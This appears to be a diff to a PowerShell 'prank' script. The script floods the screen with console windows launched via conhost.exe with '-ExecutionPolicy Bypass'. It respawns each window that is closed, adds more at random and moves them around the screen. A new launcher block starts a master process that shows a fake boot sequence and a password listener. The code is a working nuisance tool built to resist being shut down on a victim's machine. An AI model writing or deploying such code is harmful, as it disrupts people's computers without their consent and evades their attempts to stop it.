@@ -129,7 +129,7 @@ function Register-Process {
 function Spawn-NewWindow {
     param([int]$gen = 0)
     $newGen = $gen + 1
-    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoExit -WindowStyle Normal -File `"$PSCommandPath`" -child -generation $newGen"
+    Start-Process conhost.exe -ArgumentList "powershell.exe -ExecutionPolicy Bypass -NoExit -WindowStyle Normal -File `"$PSCommandPath`" -child -generation $newGen"
 }
 
 # Monitor and respawn windows
@@ -145,7 +145,7 @@ function Start-WindowMonitor {
         for ($i = 0; $i -lt $maxChildren; $i++) {
             if (Test-Path $flagFile) { break }
             Start-Sleep -Milliseconds (Get-Random -Min 200 -Max 800)
-            $proc = Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoExit -WindowStyle Normal -File `"$scriptPath`" -child -generation $($gen + 1)" -PassThru
+            $proc = Start-Process conhost.exe -ArgumentList "powershell.exe -ExecutionPolicy Bypass -NoExit -WindowStyle Normal -File `"$scriptPath`" -child -generation $($gen + 1)" -PassThru
             $children += $proc
         }
 
@@ -164,7 +164,7 @@ function Start-WindowMonitor {
                     if (-not (Test-Path $flagFile)) {
                         # Respawn with delay
                         Start-Sleep -Milliseconds (Get-Random -Min 500 -Max 1500)
-                        $newProc = Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoExit -WindowStyle Normal -File `"$scriptPath`" -child -generation $($gen + 1)" -PassThru
+                        $newProc = Start-Process conhost.exe -ArgumentList "powershell.exe -ExecutionPolicy Bypass -NoExit -WindowStyle Normal -File `"$scriptPath`" -child -generation $($gen + 1)" -PassThru
                         $children += $newProc
                     }
                 }
@@ -172,7 +172,7 @@ function Start-WindowMonitor {
 
             # Occasional "Reinforcement" (rarely add a new one if we are low)
             if ($children.Count -lt $maxChildren -and (Get-Random -Max 20) -eq 0) {
-                 $newProc = Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoExit -WindowStyle Normal -File `"$scriptPath`" -child -generation $($gen + 1)" -PassThru
+                 $newProc = Start-Process conhost.exe -ArgumentList "powershell.exe -ExecutionPolicy Bypass -NoExit -WindowStyle Normal -File `"$scriptPath`" -child -generation $($gen + 1)" -PassThru
                  $children += $newProc
             }
         }
@@ -457,17 +457,31 @@ function Move-CurrentWindow {
         $hwnd = [PrankWindowManager]::GetConsoleWindow()
         $rect = New-Object PrankWindowManager+RECT
         [PrankWindowManager]::GetWindowRect($hwnd, [ref]$rect)
-        
+
         $w = $rect.Right - $rect.Left
         $h = $rect.Bottom - $rect.Top
-        
+
         $x = Get-Random -Min 0 -Max (1920 - $w)
         $y = Get-Random -Min 0 -Max (1080 - $h)
-        
+
         [PrankWindowManager]::MoveWindow($hwnd, $x, $y, $w, $h, $true)
     } catch {}
 }
 
+# =========================================================================
+# Launcher Logic
+if (-not $child -and -not $master) {
+    Start-Process conhost.exe -ArgumentList "powershell.exe -ExecutionPolicy Bypass -NoExit -WindowStyle Normal -File `"$PSCommandPath`" -master"
+    exit
+}
+
+Register-Process
+Clear-Host
+
+if ($master) {
+    Show-BootSequence
+    Start-WindowMonitor
+}
 
 # Start password listener
 Start-PasswordListener
